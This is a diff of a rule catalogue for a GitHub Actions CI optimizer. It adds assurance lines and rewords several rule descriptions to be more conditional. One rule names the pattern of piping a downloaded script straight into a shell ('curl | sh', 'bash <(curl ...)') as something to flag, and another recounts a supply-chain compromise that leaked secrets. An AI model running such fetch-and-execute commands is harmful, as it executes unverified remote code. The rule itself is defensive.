@@ -5,6 +5,11 @@
 Each rule belongs to a ruleset. Enable presets with `extends`, toggle whole rulesets with `rulesets`, and tune
 individual rules with `rules` in `.github/ci-cd-optimizer.yml`. See [configuration](configuration.md).
 
+All detectors are heuristic and their recommendations are conditional, not universal speedup or correctness proofs.
+The production severity-precedence reducer is mechanically verified; that contract does not prove a rule's detector,
+autofix, or performance claim. See [formal assurance](formal-verification.md) and the exhaustive
+[machine-readable claim catalogue](../formal/rule-assurance.json). Missing or stale entries fail CI.
+
 Presets: `recommended`, `strict`, `agentic`, `github`, `insights`, `all`.
 
 | Rule | Kind | Default | Presets | Fixable | Description |
@@ -51,7 +56,7 @@ Presets: `recommended`, `strict`, `agentic`, `github`, `insights`, `all`.
 | [`containers/pnpm-fetch-docker-layer`](#containers-pnpm-fetch-docker-layer) | practice | info | strict |  | A pnpm-workspace Dockerfile copies every workspace package.json before `pnpm install` instead of warming the store with `pnpm fetch`. |
 | [`containers/qemu-emulated-multiarch`](#containers-qemu-emulated-multiarch) | insight | info | strict |  | Potentially emulated multi-platform builds are candidates for measured native-runner or cross-compilation alternatives. |
 | [`containers/runtime-tool-install-vs-container`](#containers-runtime-tool-install-vs-container) | insight | info | insights |  | The same tools are installed at runtime in several jobs instead of being baked into a job container image. |
-| [`containers/shared-base`](#containers-shared-base) | insight | info | insights |  | Dockerfiles that repeat the same base image and toolchain preamble should share a base image published to GHCR. |
+| [`containers/shared-base`](#containers-shared-base) | insight | info | insights |  | Review repeated base-image and toolchain preambles for possible shared-base reuse. |
 | [`containers/sleep-polling-health-check`](#containers-sleep-polling-health-check) | insight | info | recommended, agentic, strict |  | A job with service containers waits for them with a fixed `sleep` instead of a `--health-cmd` health check. |
 | [`packages/exports-map`](#packages-exports-map) | practice | info | strict, agentic |  | Library packages should declare an `exports` map, and ESM libraries a `sideEffects` field. |
 | [`packages/files-allowlist`](#packages-files-allowlist) | practice | warn | recommended, agentic |  | Publishable packages should declare a `files` allowlist (or an `.npmignore`) so the tarball only ships build output. |
@@ -75,18 +80,18 @@ Presets: `recommended`, `strict`, `agentic`, `github`, `insights`, `all`.
 | [`triggers/frequent-schedule`](#triggers-frequent-schedule) | practice | warn | recommended, agentic, strict |  | Avoid scheduled workflows that run more often than every 15 minutes. |
 | [`triggers/shard-fail-fast`](#triggers-shard-fail-fast) | practice | info | agentic, strict |  | Let sharded pull request test matrices stop early when one shard fails. |
 | [`triggers/missing-job-condition-matrix`](#triggers-missing-job-condition-matrix) | practice | info | agentic, strict |  | Gate matrix jobs on the workflow's existing change-detection job. |
-| [`redundancy/duplicate-setup-step`](#redundancy-duplicate-setup-step) | practice | warn | recommended, agentic, strict |  | A job should not run the same toolchain setup action twice with the same inputs. |
+| [`redundancy/duplicate-setup-step`](#redundancy-duplicate-setup-step) | practice | warn | recommended, agentic, strict |  | Review repeated toolchain setup declarations with matching visible inputs. |
 | [`redundancy/repeated-job-setup`](#redundancy-repeated-job-setup) | insight | info | insights |  | Jobs that repeat the same leading setup steps could share a composite action. |
 | [`redundancy/rebuild-per-job`](#redundancy-rebuild-per-job) | practice | warn | agentic, strict |  | Several jobs in a workflow should not each rebuild the same project from scratch. |
-| [`redundancy/duplicate-command`](#redundancy-duplicate-command) | practice | info | strict |  | A job should not run the same non-trivial shell command more than once. |
+| [`redundancy/duplicate-command`](#redundancy-duplicate-command) | practice | info | strict |  | Review repeated non-trivial shell commands for potentially redundant work. |
 | [`redundancy/shadowed-env`](#redundancy-shadowed-env) | practice | info | recommended, strict | yes | A job or step should not redefine an environment variable to the value it already inherits. |
 | [`redundancy/toolchain-version-drift`](#redundancy-toolchain-version-drift) | practice | warn | agentic, strict |  | Workflows should agree on the toolchain version they install with each setup action. |
-| [`testing/playwright-browser-cache`](#testing-playwright-browser-cache) | practice | warn | recommended, agentic, strict |  | Jobs that download Playwright browsers should cache them or run in the Playwright container image. |
+| [`testing/playwright-browser-cache`](#testing-playwright-browser-cache) | practice | warn | recommended, agentic, strict |  | Evaluate browser reuse when Playwright downloads are a measured bottleneck. |
 | [`testing/tool-incremental-cache`](#testing-tool-incremental-cache) | practice | info | agentic, strict |  | ESLint, tsc and Jest should keep their incremental caches between CI runs. |
 | [`testing/watch-mode-in-ci`](#testing-watch-mode-in-ci) | practice | warn | recommended, agentic, strict |  | Test runners and compilers in CI should run once instead of in watch mode. |
-| [`testing/unconditional-debug-upload`](#testing-unconditional-debug-upload) | practice | info | agentic, strict | yes | Uploads of test debugging output (reports, traces, videos, screenshots) should run only when tests fail. |
+| [`testing/unconditional-debug-upload`](#testing-unconditional-debug-upload) | practice | info | agentic, strict | yes | Consider failure-only uploads for test artifacts used solely for debugging. |
 | [`testing/masked-failures`](#testing-masked-failures) | practice | warn | recommended, agentic, strict |  | Test failures should fail the job, not be silenced by `continue-on-error: true` or `\|\| true`. |
-| [`testing/cache-disabled-install`](#testing-cache-disabled-install) | practice | info | agentic, strict |  | Jobs that restore a package-manager cache should not clear or bypass that cache in their run steps. |
+| [`testing/cache-disabled-install`](#testing-cache-disabled-install) | practice | info | agentic, strict |  | Review installs that appear to clear or bypass a configured package-manager cache. |
 | [`testing/fixed-sleep`](#testing-fixed-sleep) | practice | warn | recommended, agentic, strict |  | Run steps should wait for services to become ready instead of sleeping for a fixed time. |
 | [`nix/accept-flake-config-untrusted`](#nix-accept-flake-config-untrusted) | policy | error | recommended, agentic, strict |  | Nix accepts `nixConfig` from flakes that a pull request can modify. |
 | [`nix/builtins-fetchurl-unverified`](#nix-builtins-fetchurl-unverified) | practice | warn | recommended, agentic, strict |  | `builtins.fetchurl` downloads at evaluation time without an integrity check; pin it with `sha256` or use the `pkgs.fetchurl` fixed-output fetcher. |
@@ -146,6 +151,7 @@ Uploaded artifacts should set a short `retention-days` instead of the repository
 
 **Why:** Artifacts are kept for the repository default (90 days unless changed) and count against Actions storage. Agent-driven repositories produce many runs per day, so build outputs that only feed later jobs pile up quickly; a short retention keeps storage and quota headroom without slowing anything down.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: info; impact: low; autofix available
 - Presets: `recommended`, `agentic`
 - Options: `maxDays` (default `7`)
@@ -182,6 +188,7 @@ Pull request workflows should cancel superseded runs; deploy workflows must not.
 
 **Why:** Agents push many small commits. Without a concurrency group every push keeps running to completion, wasting runner minutes and delaying feedback. Deploy and release workflows must never cancel in-progress runs.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: warn; impact: high; autofix available
 - Presets: `recommended`, `agentic`, `strict`
 
@@ -214,6 +221,7 @@ A workflow accepting both broad `push` and `pull_request` events may repeat over
 
 **Why:** A push to an open same-repository pull request can trigger both push and pull_request runs. They are not equivalent: push usually checks the branch tip, while pull_request checks a synthetic merge commit, and event conditions, paths, permissions and required checks can differ. Review whether that overlap is intentional. Restricting push changes branch and tag coverage, so this rule never edits triggers automatically.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: warn; impact: medium
 - Presets: `recommended`, `agentic`, `strict`
 - Options: `defaultBranches` (default `["main"]`)
@@ -249,6 +257,7 @@ Jobs should set `timeout-minutes` well below the 360 minute default.
 
 **Why:** A hung job holds a runner (and every dependent job, merge queue entry, and agent loop) for up to six hours. A tight timeout turns hangs into fast, retryable failures.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: warn; impact: medium; autofix available
 - Presets: `recommended`, `agentic`, `strict`
 - Options: `defaultMinutes` (default `30`), `maxMinutes` (default `120`)
@@ -282,6 +291,7 @@ A job on a larger (multi-core or macOS large) runner that only checks out, sets 
 
 **Why:** A larger-looking runner label and familiar setup/lint commands do not establish resource needs or actual billing. Install hooks, native compilation, repository size, memory, networking and private runner policy can justify the selection. Compare representative end-to-end time, CPU/memory and current account pricing before downsizing. This is a measurement prompt, not proof of wasted cost.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: insight; default severity: info; impact: low
 - Presets: `insights`
 
@@ -319,6 +329,7 @@ A `strategy.matrix` whose version and runner dimensions multiply past the config
 
 **Why:** A matrix runs jobs for its dimension combinations and can increase runner usage and queueing. GitHub limits a matrix to 256 jobs. A configured budget is an engineering preference, not evidence that intermediate versions are redundant: reducing version coverage can miss version-specific regressions. Suggested smaller matrices preserve all categorical and shard combinations on every retained runner, but deliberately reduce version combinations and require a coverage decision. Existing include/exclude rules are never replaced automatically.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: warn; impact: medium
 - Presets: `agentic`, `strict`
 - Options: `maxJobs` (default `20`)
@@ -363,6 +374,7 @@ CI workflows that run on `pull_request` should also run on `merge_group`.
 
 **Why:** Agent-heavy repositories open and merge many pull requests at once, so a merge queue is the only practical way to keep the default branch green without serial rebases. A merge queue waits for the required checks to report on the `merge_group` event; a required-check workflow that only listens to `pull_request` never runs there, so queued pull requests stall until they time out.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: info; impact: medium
 - Presets: `agentic`, `strict`
 
@@ -392,8 +404,9 @@ References:
 
 Well-known actions should use their current major version, and local JavaScript actions should run on node24.
 
-**Why:** Old majors of the official setup, cache, checkout, and artifact actions miss performance work (faster caching backends, parallel artifact uploads) and, below the node24 releases, target Node 20, which GitHub Actions runners removed on 2026-09-23: they now force those actions onto Node 24, which their authors never tested, and warn on every run (self-hosted runners on unsupported platforms cannot run them at all). Agents copy existing workflow snippets, so one stale pin spreads quickly.
+**Why:** The maintained major/runtime table identifies releases to review for runtime support, security and performance changes. Newer majors can introduce breaking changes and are not guaranteed faster. Check the pinned action's source and release notes, target runner requirements and GitHub Enterprise Server support before upgrading; the table does not establish how an arbitrary pinned release was tested or executed.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: warn; impact: medium
 - Presets: `recommended`, `agentic`, `strict`
 
@@ -426,6 +439,7 @@ Language setup actions (setup-node, setup-python, setup-go, setup-dotnet) should
 
 **Why:** Without explicit version inputs or supported implicit version files, setup actions generally fall back to pre-installed toolchains. Hosted image updates or custom runner provisioning may then change the selected version. Reusing the project's supported version file can align CI and local development, but version ranges, aliases and .NET roll-forward policies still permit different releases. A version input is not a hermetic-build guarantee. Selecting a toolchain can change behavior and therefore is never automatically applied.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: warn; impact: medium
 - Presets: `recommended`, `agentic`, `strict`
 
@@ -464,6 +478,7 @@ Review `needs` edges without a recognized data transfer; they still provide succ
 
 **Why:** Hosted jobs do not share their ordinary filesystem merely because one needs another. Outputs, artifacts, caches and external systems can transfer data. Even without data transfer, needs provides ordering and success/skip/failure gating; an installation can intentionally validate dependencies or have external side effects. This insight identifies no recognized data transfer, not a redundant edge. Removing it changes behavior and requires an explicit decision about gating and concurrency.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: insight; default severity: info; impact: medium
 - Presets: `insights`, `strict`
 - Requires: `complete-inventory`
@@ -512,6 +527,7 @@ Affected/changed-only commands need the base commit, which a default shallow che
 
 **Why:** `actions/checkout` fetches a single commit by default. Affected-only tooling (nx affected, turbo --affected, pnpm/turbo `[ref]` filters, jest --changedSince, git diff against the base) then either fails with an unknown revision or silently falls back to running everything, which defeats the selection that makes agent-scale CI affordable.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: error; impact: high
 - Presets: `recommended`, `agentic`, `strict`
 
@@ -548,6 +564,7 @@ Full-history checkouts (`fetch-depth: 0`) should use a blobless partial clone (`
 
 **Why:** `fetch-depth: 0` downloads every version of every file ever committed, which dominates checkout time in large or long-lived repositories. A blobless partial clone keeps the full commit graph that history-aware tools (affected detection, changelogs, versioning) need, and fetches file contents lazily only when a command reads them. Agent-driven repositories run many more jobs, so the saving compounds.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: warn; impact: medium; autofix available
 - Presets: `recommended`, `agentic`
 
@@ -581,6 +598,7 @@ Jobs that only work inside one workspace package of a large monorepo can use a s
 
 **Why:** In large monorepos most of the checkout is files a package-scoped job never reads. A cone-mode sparse checkout of the package, its workspace dependencies, and shared config keeps checkout and disk usage proportional to the job, which adds up when agents trigger many small package-level runs.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: info; impact: medium
 - Presets: `strict`
 - Requires: `repository`
@@ -619,6 +637,7 @@ Multi-job pull request workflows in a monorepo should skip jobs whose area did n
 
 **Why:** In a monorepo most pull requests touch one area, yet every job still provisions a runner, restores caches, and installs dependencies. A small change-detection job that feeds job-level `if:` conditions skips the unrelated jobs entirely. Agent-driven repositories open many narrow pull requests, so the savings compound, and an always-run gate job keeps branch protection simple because skipped jobs report success.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: info; impact: medium
 - Presets: `agentic`, `strict`
 - Requires: `repository`
@@ -675,6 +694,7 @@ Pull request workflows should not skip themselves with trigger-level `paths` fil
 
 **Why:** When `paths`/`paths-ignore` skips a pull request workflow, its checks never report and stay Pending, so a pull request that requires them cannot merge. Agents then stall or someone adds a bypass. Running the workflow on every pull request and skipping work with job-level `if:` conditions keeps the speed benefit: skipped jobs report success, and an always-run gate job gives branch protection one stable check.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: warn; impact: medium
 - Presets: `recommended`, `agentic`, `strict`
 
@@ -723,6 +743,7 @@ Pull request CI in a monorepo should test only the projects affected by the chan
 
 **Why:** Running every project's tests on every pull request makes CI time grow with the size of the repository instead of the size of the change. Agents open many small pull requests, so affected-only selection (nx affected, turbo --affected, pnpm `[ref]` filters, lerna --since) is the biggest lever for keeping feedback fast and runner minutes bounded.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: warn; impact: high
 - Presets: `recommended`, `agentic`
 
@@ -759,6 +780,7 @@ Change-detection steps must not use tj-actions/changed-files versions affected b
 
 **Why:** Change detection runs on every pull request, often with secrets in scope. In March 2025 the tags of tj-actions/changed-files were repointed to a malicious commit that dumped runner memory, including secrets, into workflow logs (CVE-2025-30066). Versions before v46.0.1 are in the advisory's affected range; agents copying an old snippet reintroduce it.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: error; impact: high
 - Presets: `recommended`, `agentic`, `strict`
 
@@ -789,8 +811,9 @@ References:
 
 Build tools with their own caches (Gradle, Maven, Cargo, Bazel, Turborepo, Nx) should persist them between runs.
 
-**Why:** Gradle, Maven, Cargo, Bazel, Turborepo and Nx skip downloads and unchanged work when their caches are warm, but hosted runners start empty. Without a cache action or a remote cache, every run (and every agent iteration) rebuilds from scratch.
+**Why:** Gradle, Maven, Cargo, Bazel, Turborepo and Nx can reuse downloads or build outputs when compatible caches are warm. Fresh runners often lack that state, but remote caches, preinstalled dependencies and tool-specific invalidation can change the benefit. A missing visible cache is a candidate for measurement, not proof that all work is repeated or that adding a cache will be faster.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: info; impact: medium
 - Presets: `recommended`, `agentic`
 
@@ -824,8 +847,9 @@ References:
 
 actions/cache keys must invalidate when inputs change and still hit between runs.
 
-**Why:** A static key never changes, so the cache goes stale forever (caches are immutable once saved). A key containing the commit SHA or run id without `restore-keys` misses on every run, paying the upload cost with no benefit. Caching node_modules for `npm ci` is wasted work because `npm ci` deletes node_modules before installing.
+**Why:** A static primary key does not encode dependency changes. SHA/run-scoped keys can prevent reuse across different context values, although reruns can reuse a key and Actions cache scope/version, prefix lookup and eviction also affect hits. Whether removing a context is safe depends on the workload's actual dependencies. `formal cache-key` checks only an explicit primary-key string-partition model relative to declared dependencies; it does not prove hits or speedups. Restoring node_modules before an unconditional `npm ci` is usually wasteful because npm ci removes that directory.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved. Optional cache-key certificates prove only the declared-dependency string-partition model.
 - Kind: practice; default severity: warn; impact: medium
 - Presets: `recommended`, `agentic`, `strict`
 
@@ -860,8 +884,9 @@ References:
 
 Docker image builds in CI should import and export a layer cache.
 
-**Why:** Hosted runners start with an empty BuildKit cache, so without `cache-from`/`cache-to` every layer (including dependency installs) is rebuilt on every run. The GitHub Actions cache backend defaults every build to the same `buildkit` scope, so multiple images overwrite each other's cache unless each gets a unique `scope`. Inline cache only supports `mode=min` (final-stage layers); a registry cache with `mode=max` also caches intermediate stages.
+**Why:** Fresh BuildKit builders may repeat expensive layers without reusable cache state; remote or persistent builders can differ. The GitHub Actions backend's default `buildkit` scope can cause builds to overwrite one another's exported cache. Separate scopes and appropriate import/export settings may improve reuse, but transfer overhead and invalidation still require measurement. Inline cache supports mode=min; a registry cache with mode=max can include intermediate stages.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: warn; impact: high
 - Presets: `recommended`, `agentic`
 
@@ -899,6 +924,7 @@ Native-output cache keys should distinguish matrix platforms when modeled cache 
 
 **Why:** Cache matching depends on key, version and accessible branch scope. Versions include configured paths and compression details; Windows has additional cross-OS handling. Under the modeled hosted-runner/action behavior, equal visible inputs can permit incompatible native outputs to share a key. Custom compression, action versions or external configuration can change the version. Concurrent cold runs may all miss before a later run restores the winning cache. Changing keys must preserve every paired restore/save expression and caller, so no automatic rewrite is offered.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: warn; impact: high
 - Presets: `recommended`, `agentic`, `strict`
 
@@ -945,6 +971,7 @@ A workflow that only runs on `pull_request` saves caches no other pull request o
 
 **Why:** A cache saved by a pull_request run is scoped to its merge ref and can be useful on subsequent commits or reruns of that pull request, but cannot seed other pull requests or the base branch. PR runs can also restore accessible base/default-branch caches with compatible keys and versions. No recognized non-PR writer in the inspected repository does not prove no cache exists: history, external workflows and other cache actions may supply one. Compare hit rates, transfer cost and storage policy before adding trusted-branch warming; do not remove useful PR writes automatically.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: insight; default severity: info; impact: medium
 - Presets: `insights`, `strict`
 - Requires: `complete-inventory`
@@ -993,8 +1020,9 @@ References:
 
 Language setup actions should cache downloaded dependencies.
 
-**Why:** Without caching, every run re-downloads all dependencies from the registry, which is often the slowest part of a job and is repeated on every agent iteration. setup-node, setup-python, setup-java and setup-dotnet only cache when `cache` is set (setup-node v6+ auto-caches npm only when package.json `packageManager` names npm); setup-go caches by default.
+**Why:** Dependency downloads can be a large repeated cost on fresh runners. An effective cache may reduce that cost, but prewarmed runners, external caches and restore/upload overhead can change the benefit; measure the affected job. setup-node, setup-python, setup-java and setup-dotnet support explicit `cache` settings (setup-node v6+ also auto-caches npm when package metadata selects npm); setup-go caches by default.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: warn; impact: high; autofix available
 - Presets: `recommended`, `agentic`
 
@@ -1031,6 +1059,7 @@ Artifacts that only contain already-compressed files should be uploaded with `co
 
 **Why:** Recognized actions/upload-artifact versions default to compression-level 6. Extensions such as .gz and .zip commonly identify compressed content, but archives may contain uncompressed entries and extension alone is not evidence of actual bytes or upload-time savings. Level 0 preserves extracted file contents but changes archive bytes, size and digest. Compare representative transfer/storage cost and consumer expectations before manually changing compression policy.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: info; impact: low
 - Presets: `recommended`, `agentic`, `strict`
 
@@ -1066,8 +1095,9 @@ References:
 
 Dockerfile base images should use pinned versions (and digests when required).
 
-**Why:** `FROM image` or `FROM image:latest` silently changes whenever upstream publishes, which breaks reproducibility and invalidates the layer cache for every following instruction. A version tag makes upgrades explicit; a digest makes builds fully reproducible.
+**Why:** Untagged and latest-tag base images can change when their registry tags move, affecting build inputs and layer reuse. Version tags communicate upgrade intent but can also move. A digest pins the referenced image content; it does not make the entire build reproducible, because downloads, toolchains and other inputs may still vary.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: warn; impact: medium
 - Presets: `recommended`, `agentic`, `strict`
 - Options: `requireDigest` (default `false`)
@@ -1098,6 +1128,7 @@ CI installs must be locked to the committed lockfile.
 
 **Why:** `npm install` and unfrozen yarn/bun installs can rewrite the lockfile and resolve different versions per run, which breaks reproducibility and cache keys. Frozen installs are also faster.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: error; impact: medium; autofix available
 - Presets: `recommended`, `agentic`, `strict`
 
@@ -1127,6 +1158,7 @@ Third-party actions and reusable workflows should be pinned to a full commit SHA
 
 **Why:** Tags and branches can be moved, so `@v4` may run different code tomorrow than today, which breaks reproducibility and is a supply-chain risk. A full-length commit SHA is immutable. (OpenSSF Scorecard also treats a tag backed by an immutable release as pinned, but most action tags are not immutable releases and this cannot be verified offline.)
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: warn; impact: low
 - Presets: `strict`
 - Options: `ignoreOwners` (default `[]`)
@@ -1155,8 +1187,9 @@ References:
 
 Job containers and service containers should use pinned image versions.
 
-**Why:** An image with no tag or `:latest` changes whenever upstream publishes, so a job's toolchain or a service's database version can change between two runs of the same commit. A version tag makes upgrades explicit; a digest makes them fully reproducible.
+**Why:** Untagged and latest-tag images can change between runs when registry tags move. Version tags communicate upgrade intent but can also move. A digest pins the referenced image content; it does not establish reproducibility of the full job or of mutable external dependencies.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: warn; impact: medium
 - Presets: `recommended`, `agentic`, `strict`
 - Options: `requireDigest` (default `false`)
@@ -1191,6 +1224,7 @@ Jobs should run on a pinned runner image label instead of `*-latest`.
 
 **Why:** `ubuntu-latest`, `windows-latest` and `macos-latest` move to a new OS image during a gradual multi-week rollout, so identical commits can pass on one run and fail on the next with different toolchains and preinstalled software. `ubuntu-latest` is migrating from Ubuntu 24.04 to 26.04 between Oct 19 and Nov 19, 2026. Pinning makes the upgrade a deliberate, reviewable change.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: warn; impact: medium; autofix available
 - Presets: `recommended`, `agentic`, `strict`
 - Options: `ubuntu` (default `"ubuntu-24.04"`), `windows` (default `"windows-2025"`), `macos` (default `"macos-15"`)
@@ -1223,6 +1257,7 @@ apt and apk installs in Dockerfiles should skip recommended packages, update and
 
 **Why:** Recommended packages and leftover package indexes add tens of megabytes to every layer that is pushed, pulled, and cached. `apt-get update` in its own RUN creates a layer that BuildKit keeps reusing, so later installs run against a stale index (or fail). Smaller layers mean faster pulls on every ephemeral CI runner and agent sandbox.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: warn; impact: low; autofix available
 - Presets: `recommended`, `agentic`, `strict`
 
@@ -1255,6 +1290,7 @@ Multi-platform image builds must not be loaded into the classic Docker image sto
 
 **Why:** The classic Docker image store cannot hold multi-platform images. Loading a multi-platform build therefore requires a compatible exporter and containerd image store, or a separate single-platform test build. Runner labels alone do not prove which store is enabled: hosted images change and workflows can address custom daemons. This is a compatibility check to verify, not a prediction that every such job fails.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: insight; default severity: warn; impact: high
 - Presets: `recommended`, `agentic`, `strict`
 
@@ -1292,6 +1328,7 @@ Dependency installs and compiles in Dockerfiles should use BuildKit cache mounts
 
 **Why:** When a dependency layer is invalidated, a cache mount (`RUN --mount=type=cache`) lets the package manager reuse previously downloaded packages and compiler output instead of fetching everything again, and keeps those caches out of the image. Cache mounts live in the builder, so on ephemeral hosted runners pair them with a persistent builder or export them (for example with buildkit-cache-dance) to benefit across CI runs.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: info; impact: medium
 - Presets: `agentic`, `strict`
 
@@ -1327,6 +1364,7 @@ A script is downloaded and executed in one go (`curl | sh`, `bash <(curl ...)`) 
 
 **Why:** A direct download-to-interpreter stream executes bytes before the complete payload can be checked locally. A checksum command elsewhere in the step, or a check after execution, does not verify that stream. Download to a file and require successful verification of that exact file before execution. Use an independently trusted expected digest or signing key. Verification authenticates payload bytes; it does not make the script, its network dependencies or the overall build hermetic.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: policy; default severity: error; impact: high
 - Presets: `recommended`, `agentic`, `strict`
 
@@ -1358,6 +1396,7 @@ Dockerfiles should install dependencies from manifests and lockfiles before copy
 
 **Why:** BuildKit reuses a layer only while every input above it is unchanged. Copying the whole context before the install means each source edit (every agent iteration) re-downloads and re-installs all dependencies; copying only manifests and lockfiles first keeps the dependency layer cached until dependencies actually change.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: warn; impact: high
 - Presets: `recommended`, `agentic`
 
@@ -1397,6 +1436,7 @@ Push and pull-request image builds should not pass --no-cache when they import a
 
 **Why:** `--no-cache` bypasses reusable instruction results for the stages built; unused stages need not run, and cache mounts or external dependency caches can still help. A declared cache import or self-hosted builder does not prove a usable hit. `--pull` refreshes base-image resolution but does not refresh an otherwise cached RUN apt-get install or other mutable download. Preserve the project's freshness policy; measure cache hits and use intentional full or selected-stage rebuilds when required.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: warn; impact: high
 - Presets: `recommended`, `agentic`, `strict`
 
@@ -1438,6 +1478,7 @@ Docker build contexts that are copied into images should have a .dockerignore ex
 
 **Why:** Without a .dockerignore, `COPY . .` sends and hashes the whole context, including `.git`, `node_modules`, and local build output. Every commit, install, or agent scratch file then changes the COPY checksum and invalidates that layer and everything after it, and large contexts slow down every build.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: warn; impact: medium
 - Presets: `recommended`, `agentic`
 - Requires: `complete-inventory`
@@ -1472,6 +1513,7 @@ Consider distinct gha cache scopes for modeled build variants that can replace e
 
 **Why:** The gha backend's scope defaults to buildkit. Multiple exports sharing that scope can replace its index within the same repository/branch cache namespace. Some layers, local builder caches or other imports can still be reused; replacement is not proof of rebuilding from scratch. Scope expressions should distinguish relevant image/platform variants and agree across every importer/exporter. That cross-file contract is not established by this detector, so changes require review rather than automatic edits.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: warn; impact: high
 - Presets: `recommended`, `agentic`, `strict`
 
@@ -1516,6 +1558,7 @@ A multi-stage build exports a minimal cache that omits intermediate-stage layers
 
 **Why:** BuildKit's mode=min export includes layers in the resulting image, not all intermediate-stage layers. A fresh builder relying only on that export may repeat intermediate work; local caches and other exporters can still avoid it. mode=max exports intermediate layers too, which can increase transfer/storage and disclose source or sensitive files intentionally omitted from the final image. Review cache access, secret handling and measured benefit before opting in; this is not a safe automatic edit.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: info; impact: medium
 - Presets: `strict`
 
@@ -1551,6 +1594,7 @@ Single-stage Dockerfiles that install build toolchains or dev dependencies shoul
 
 **Why:** Compilers, git, and devDependencies are only needed to build. Shipping them makes every pull, push, and layer upload larger and slower (and widens the attack surface). A multi-stage build compiles in a builder stage and copies only artifacts into a slim or distroless runtime stage; BuildKit also builds independent stages in parallel.
 
+- Assurance: Detector: heuristic, not formally proved. Recommendation: conditional, not a universal improvement guarantee. Severity precedence: machine-proved.
 - Kind: practice; default severity: info; impact: medium
 - Presets: `recommended`, `agentic`
 
